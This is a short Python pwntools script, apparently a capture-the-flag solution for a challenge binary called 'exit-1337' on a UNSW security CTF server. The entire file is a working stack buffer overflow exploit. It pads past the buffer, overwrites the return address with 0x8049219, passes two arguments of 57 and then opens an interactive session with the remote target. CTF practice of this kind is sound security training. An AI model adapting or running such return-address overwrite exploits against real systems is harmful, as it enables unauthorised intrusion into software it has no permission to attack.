from pwn import *

# p = process('./exit-1337')
p = remote('pwn.ctf.unswsecurity.com', 7006)

payload = b''
payload += b'A' * (0x26+0x4)
payload += p32(0x8049219)
payload += p32(57)
payload += p32(57)


pause()

p.sendline(payload)

p.interactive()